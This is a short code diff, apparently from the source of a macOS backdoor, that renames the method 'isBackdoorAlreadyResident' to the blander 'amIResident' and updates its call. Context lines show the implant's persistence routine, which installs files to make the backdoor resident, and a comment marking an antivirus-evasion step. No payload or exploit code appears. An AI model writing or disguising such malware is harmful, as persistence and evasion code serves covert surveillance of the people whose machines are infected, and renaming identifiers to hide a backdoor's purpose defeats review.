@@ -3815,7 +3815,7 @@ static void computerWillShutdown(CFMachPortRef port,
                              forBinary:gBackdoorName];
 }
 
-- (BOOL)isBackdoorAlreadyResident
+- (BOOL)amIResident
 { 
   // for upgrade from old version
   removeOldLd();
@@ -4110,7 +4110,7 @@ static void computerWillShutdown(CFMachPortRef port,
 
   // Check if the backdoor is already resident
   // otherwise add all the required files for making it resident
-  if ([self isBackdoorAlreadyResident] == NO)
+  if ([self amIResident] == NO)
     {  
       
       // AV evasion: only on release build
